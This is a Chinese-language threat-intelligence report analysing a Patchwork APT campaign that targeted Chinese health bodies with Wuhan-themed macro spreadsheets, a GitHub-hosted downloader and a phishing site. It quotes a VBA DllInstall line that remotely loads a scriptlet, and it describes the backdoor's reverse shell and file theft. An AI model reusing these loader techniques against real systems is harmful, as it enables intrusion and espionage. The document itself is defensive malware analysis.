
# [原创]烈火烧不尽的“恶性毒草”—— 摩诃草APT组织的攻击活动

## 一． 概述

印度背景的APT组织代号为APT-C-09，又名摩诃草,白象,PatchWork, angOver,VICEROY TIGER,The Dropping Elephan。

摩诃草组织主要针对中国、巴基斯坦等亚洲地区国家进行网络间谍活动，其中以窃取敏感信息为主。相关攻击活动最早可以追溯到2009年11月，至今还非常活跃。在针对中国地区的攻击中，该组织主要针对政府机构、科研教育领域进行攻击，其中以科研教育领域为主。

摩诃草组织最早由Norman安全公司于2013年曝光，随后又有其他安全厂商持续追踪并披露该组织的最新活动，但该组织并未由于相关攻击行动曝光而停止对相关目标的攻击，相反从2015年开始更加活跃。

从2009年至今，该组织针对不同国家和领域至少发动了3波攻击行动和1次疑似攻击行动。整个攻击过程使用了大量系统漏洞，其中至少包括一次0day漏洞攻击;该组织所采用的恶意代码非常繁杂。载荷投递的方式相对传统，主要是以鱼叉邮件进行恶意代码的传播，另外部分行动会采用少量水坑方式进行攻击；值得关注的是，在最近一次攻击行动中，出现了基于即时通讯工具和社交网络的恶意代码投递方式，进一步还会使用钓鱼网站进行社会工程学攻击。在攻击目标的选择上，该组织主要针对Windows系统进行攻击，同时我们也发现了存在针对Mac OS X系统的攻击，从2015年开始，甚至出现了针对Android OS移动设备的攻击

Gcow安全团队追影小组于2019.11月底通过监测的手段监测到了该组织的一些针对我国医疗部门的活动.直至2020.2月初,摩诃草APT组织通过投递带有恶意宏文件的xls文件,以及使用带有诱饵文档通过点击下载托管于GitHub上的downloader样本,以及用相应的钓鱼网站,用以侦探情报等一系列活动.这对我国的相关部门具有很大的危害,追影小组对其活动进行了跟踪与分析,写成报告供给各位看官更好的了解该组织的一些手法。

l 当然肯定有人会问为什么你说的简介里摩诃草组织这么厉害,而这次活动却水平不如之前呢?

l 本团队的追影小组主观认为因为这次活动只是该组织下的CNC小组所开展的活动，文末会给出相应的关联证据.不过这只是一家之言还请各路表哥多加批评

注意：文中相关IOCs由于特殊原因不给予放出,敏感信息已经打码处理

## 二． 样本分析

### 2.1分析文档(武汉旅行信息收集申请表.xlsm)

该诱饵文档托管于该网址上

b10K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4S2^5P5q4)9J5k6s2S2^5P5q4)9J5k6h3y4G2L8g2)9J5c8W2)9J5y4f1f1$3i4K6t1#2b7f1c8Q4x3U0g2m8y4W2)9J5y4f1f1$3i4K6t1#2b7U0q4Q4x3U0f1^5z5g2)9J5y4f1f1$3i4K6t1#2z5e0N6Q4x3U0f1^5y4g2)9J5y4f1f1^5i4K6t1#2b7e0q4Q4x3U0f1^5b7#2)9J5y4f1f1@1i4K6t1#2b7V1k6Q4x3U0g2m8x3g2)9J5y4f1f1$3i4K6t1#2z5o6q4Q4x3U0g2m8c8W2)9J5y4f1f1$3i4K6t1#2z5e0c8Q4x3U0g2n7y4W2)9J5y4f1f1&6i4K6t1#2z5f1u0Q4x3U0f1^5y4W2)9J5y4f1f1%4i4K6t1#2z5e0c8Q4x3U0g2n7x3#2)9J5y4f1f1^5i4K6t1#2b7f1k6Q4x3U0g2n7y4#2)9J5y4f1f1^5i4K6t1#2b7e0q4Q4x3U0g2m8z5q4)9J5k6i4S2D9M7$3@1`.

#### 2.1.1.诱饵文档

![](https://bbs.kanxue.com/upload/attach/202002/879321_MEPRKD4KV7W765B.jpg)

这是一个含有宏的xlsm电子表格文件，利用社会工程学的办法,诱使目标”启用内容”来执行宏恶意代码

提取的宏代码如下

![](https://bbs.kanxue.com/upload/attach/202002/879321_QCJJKHXD5UBQMMR.jpg)

#### 2.1.2. 恶意宏代码

当目标启用内容后就会执行`Workbook_Open`的代码

```
DllInstall False, ByVal StrPtr(Sheet1.Range("X100").Value)
```

通过加载`scrobj.dll`调用

远程加载`4b9K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0b7#2i4K6u0W2P5s2S2^5i4K6u0W2P5s2S2^5i4K6u0W2y4U0N6Q4x3V1k6%4K9h3&6V1L8%4N6Q4x3X3g2K6j5%4c8Q4x3V1y4Q4c8e0S2Q4b7V1k6Q4z5e0W2Q4c8e0N6Q4b7e0N6Q4z5p5c8Q4c8e0k6Q4z5e0S2Q4b7f1k6Q4c8e0g2Q4z5o6S2Q4b7e0W2Q4c8e0N6Q4z5e0c8Q4b7e0S2y4K9h3y4J5L8%4y4G2k6Y4c8Q4c8e0N6Q4b7U0y4Q4b7V1u0Q4c8e0N6Q4b7V1u0Q4z5f1k6Q4c8e0k6Q4z5e0k6Q4z5o6N6Q4c8e0c8Q4b7V1u0Q4b7U0k6Q4c8e0N6Q4z5f1q4Q4z5o6c8x3e0@1I4T1K9h3&6Q4c8e0c8Q4b7V1u0Q4b7e0g2Q4c8e0N6Q4b7V1u0Q4z5e0g2Q4c8e0S2Q4b7V1k6Q4z5o6N6Q4c8e0k6Q4z5f1c8Q4z5o6m8Q4c8e0S2Q4b7V1c8Q4b7f1k6Q4c8e0N6Q4z5f1q4Q4z5o6c8Q4c8e0N6Q4z5f1u0Q4z5e0q4Q4c8e0k6Q4b7U0g2Q4z5p5u0Q4c8f1k6Q4b7V1y4Q4z5p5y4Q4c8e0S2Q4b7V1g2Q4b7V1g2Q4c8e0g2Q4z5o6S2Q4b7U0m8Q4c8e0S2Q4b7V1k6Q4z5f1y4Q4c8e0N6Q4b7e0S2Q4z5p5u0Q4c8e0k6Q4z5o6W2Q4b7e0N6Q4c8e0S2Q4b7e0q4Q4z5p5y4Q4c8e0c8Q4b7V1u0Q4b7e0y4Q4c8e0N6Q4b7e0m8Q4z5o6q4Q4c8e0N6Q4z5f1u0Q4b7f1g2Q4c8e0N6Q4z5f1q4Q4z5o6c8Q4c8e0y4Q4z5o6m8Q4z5o6t1`.

其中`Sheet1.Range("X100").Value` 是小技巧，将payload隐藏在Sheet1中，通过VBA获取下载地址，起到一定混淆保护效果

![](https://bbs.kanxue.com/upload/attach/202002/879321_UT8NQTQUU9JS7D5.jpg)

#### 2.1.3. 恶意sct文件(windows.sct)

通过`windows.sct`再下载到到启动目录，并重名为`Temp.exe`,并运行该程序

如下图

![](https://bbs.kanxue.com/upload/attach/202002/879321_BJAYQCSBQVPMKPN.jpg)

系统启动文件夹

![](https://bbs.kanxue.com/upload/attach/202002/879321_KS4TYWGA6TDAQ6K.jpg)

#### 2.1.4.后门分析(msupdate.exe)

文件信息:

![](https://bbs.kanxue.com/upload/attach/202002/879321_KG3R3XBP8X6NTNY.jpg)

![](https://bbs.kanxue.com/upload/attach/202002/879321_MUYKZFFQR739D9W.jpg)

主要功能:

1.自身拷贝到当前用户的`AppData\Roaming`和`C:\Microsoft`目录下并重命名`msupdate.exe`,并且创建并写入`uuid.txt`,来标识不同用户

![](https://bbs.kanxue.com/upload/attach/202002/879321_5KTYYP76CY4JSA6.jpg)

![](https://bbs.kanxue.com/upload/attach/202002/879321_4JMZWWGX88JMQDX.jpg)

2.通过com组件创建计划任务，实现持久化控制。

![](https://bbs.kanxue.com/upload/attach/202002/879321_FBU5V72XTYDU8BX.jpg)

![](https://bbs.kanxue.com/upload/attach/202002/879321_VD53Z7AN2P9ASWA.jpg)

3. 与服务器进行C&C通讯，实现了shell,文件上传与下载(ftp),获取屏幕快照功能，达到完全控制目标。

获取uuid通知主机上线

![](https://bbs.kanxue.com/upload/attach/202002/879321_QBDAHDZ629MUNUD.jpg)

通过http协议与服务器进行通讯，并获取相关指令

上线指令

![](https://bbs.kanxue.com/upload/attach/202002/879321_5HXTP5KY45WVBZM.jpg)

反向Cmd Shell相关代码

![](https://bbs.kanxue.com/upload/attach/202002/879321_73RE734TX96FTP2.jpg)

![](https://bbs.kanxue.com/upload/attach/202002/879321_JTRMXDKGWQEZU65.jpg)

文件上传相关代码

![](https://bbs.kanxue.com/upload/attach/202002/879321_NAY2VUR4W4WFHJU.jpg)

文件下载相关代码

![](https://bbs.kanxue.com/upload/attach/202002/879321_WH2GVA8WHXARZCJ.jpg)

屏幕快照相关代码

![](https://bbs.kanxue.com/upload/attach/202002/879321_42CBTKNEW48ZBSY.jpg)

![](https://bbs.kanxue.com/upload/attach/202002/879321_4T5H58TAYG937QN.jpg)

### 2.2 分析文档(卫生部指令.docx)

该文档托管于

2dcK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4S2^5P5q4)9J5k6s2S2^5P5q4)9J5k6h3y4G2L8g2)9J5c8X3S2Q4y4h3j5^5y4K6V1^5x3K6b7&6x3K6u0Q4x3V1k6Q4x3U0g2q4y4g2)9J5y4e0S2p5i4K6t1#2b7f1u0Q4x3U0g2q4y4#2)9J5y4e0V1@1i4K6t1#2z5f1k6Q4x3U0g2q4z5g2)9J5y4e0R3K6i4K6t1#2b7e0S2Q4x3U0g2q4y4W2)9J5y4e0S2o6i4K6t1#2z5o6N6Q4x3U0g2q4y4q4)9J5y4f1u0n7i4K6t1#2b7e0c8Q4x3X3g2V1L8$3y4^5

#### 2.2.1 诱饵文档

![](https://bbs.kanxue.com/upload/attach/202002/879321_R2B5FGZSDNNV2M3.jpg)

#### 2.1.2 Downloader分析

诱使目标点击提交按钮，触发`Shell.Explorer.1` 从internet Explorer下载并运行`submit_details.exe`木马程序.

文件信息:

![](https://bbs.kanxue.com/upload/attach/202002/879321_KTUUB7TD9CNV5ZE.jpg)

![](https://bbs.kanxue.com/upload/attach/202002/879321_HN4VH6TFJG8ZT5B.jpg)

功能分析:

1.建立计划任务

![](https://bbs.kanxue.com/upload/attach/202002/879321_AZ2CUXNFTPFU85T.jpg)

![](https://bbs.kanxue.com/upload/attach/202002/879321_Z6TEF7N5A576X7T.jpg)

2.收集目标机器名，ip，等信息

![](https://bbs.kanxue.com/upload/attach/202002/879321_U57HWMNHBRY9W3N.jpg)

3.下载后门程序

通过Github 白名单下载文件，绕过IDS检测.

部分代码

![](https://bbs.kanxue.com/upload/attach/202002/879321_92P9RWJYHACXFVG.jpg)

![](https://bbs.kanxue.com/upload/attach/202002/879321_32KRTYCXMUKYATW.jpg)

4.获取Github上的文件下载路径，目前文件已被删除

![](https://bbs.kanxue.com/upload/attach/202002/879321_DHCJVWMTV4CB7WX.jpg)

### 2.3 钓鱼网站

钓鱼网址为097K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4S2^5P5q4)9J5k6s2S2^5P5q4)9J5k6h3y4G2L8g2)9J5c8Y4y4#2j5X3#2A6N6q4)9J5k6h3S2@1L8h3I4Q4c8e0c8Q4b7V1y4Q4b7f1q4Q4c8e0S2Q4b7e0y4Q4z5o6g2Q4c8e0k6Q4z5o6S2Q4z5e0m8Q4c8e0k6Q4z5f1k6Q4z5e0m8Q4c8e0W2Q4z5o6y4Q4b7e0S2Q4c8e0W2Q4z5e0N6Q4b7e0S2Q4c8e0N6Q4z5f1q4Q4z5o6c8Q4c8e0S2Q4b7U0m8Q4z5o6y4Q4c8e0k6Q4z5f1k6Q4b7e0g2Q4c8e0S2Q4b7e0q4Q4b7e0S2Q4x3V1y4Q4c8e0k6Q4z5e0c8Q4b7U0k6Q4c8e0W2Q4z5f1u0Q4z5o6k6Q4c8e0c8Q4b7V1q4Q4b7V1q4Q4c8e0g2Q4z5e0q4Q4z5e0S2Q4c8e0c8Q4b7V1k6Q4b7e0q4Q4c8e0k6Q4z5o6q4Q4b7f1j5`.

![](https://bbs.kanxue.com/upload/attach/202002/879321_7SF5JYCCQ7AD3F7.jpg)

通过whois查询，网站是2020年1月23日注册，2月6日更新后停止访问

![](https://bbs.kanxue.com/upload/attach/202002/879321_SXEPWPS62QXV3WU.jpg)

## 三.关联分析

该活动与摩诃草APT组织旗下的CNC小组有着很多的联系

CNC小组取名来自360于2019年底发布的报告《南亚地区APT组织2019年度攻击活动总结》中提及的摩诃草使用新的远程控制木马,同时通过其pdb路径信息中包含了`cnc_client`的字样,故命名为`cnc_client`小组.在此次活动中,该组织的特征与之高度类似,故团队猜测该活动的作俑者来源于摩诃草旗下的CNC小组

![](https://bbs.kanxue.com/upload/attach/202002/879321_YH4WNZQEMHKEXW3.jpg)

下面我们将向各位看官详细的描述这几点相同之处

(左边的图来自于360的年度报告,右边的图来自于本次活动的截图)

1).反向shell功能:

![](https://bbs.kanxue.com/upload/attach/202002/879321_TV3D3ZEYAQTK2V8.jpg)

2).文件上传功能

![](https://bbs.kanxue.com/upload/attach/202002/879321_SV868RMWWCHXW65.jpg)

3).文件下载功能

![](https://bbs.kanxue.com/upload/attach/202002/879321_CJTUUWY54HVJ2JG.jpg)

并且在该所会连的域名中出现了`cnc`的字眼,故本小组大胆猜测该小组对原先的`cnc_client`进行了进一步的修改,但是其主体逻辑框架保持不变。在侧面上反应了该组织也很积极的修改相关的恶意软件代码以躲避杀毒软件的侦查

![](https://bbs.kanxue.com/upload/attach/202002/879321_WE2PJY98G2C93UE.jpg)

## 四.总结

在这次活动中摩诃草组织为了增加其攻击活动的成功性,在诱饵文档中使用了某部门的名称和某部门的徽标以增加其可信性,同时在其托管载荷的网站上引用了`nhc`这个字符串,Gcow安全团队追影小组在此大胆推测,该组织使用鱼叉邮件的方式去投递含有恶意文档url的邮件.同时在这次活动中所出现的url上也存在”`nhc`”,”`gxv`”,”`cxp`”等字眼,这很大的反应出攻击者对中国元素的了解,社会工程学的使用灵活以及拥有一定的反侦查能力,这无疑是对我国网络安全的一次挑战,还请相关人士多多排查,培养员工安全意识也是重中之重的.

最后本小组也想发发牢骚,其实这样的活动不能说天天都有,但是每一周有一次的频率还是存在的。印度趁人之危固然不对,但是某些借此炒作,搞流量变现的,连样本都没分析透彻,只看只言片语就对该组织的手法以及该国家的网络安全实力立下高判,将自己的无知言论变为吸引别人为自己谋取利益的某些高手。把不正确的情况与思想带给你的关注者,让他们对真实的情况并不了解甚至低估,您难道不觉得心痛吗?这对得起你前辈的初衷吗?鄙人沥肝劝君,万不可一知半解而授业于人。
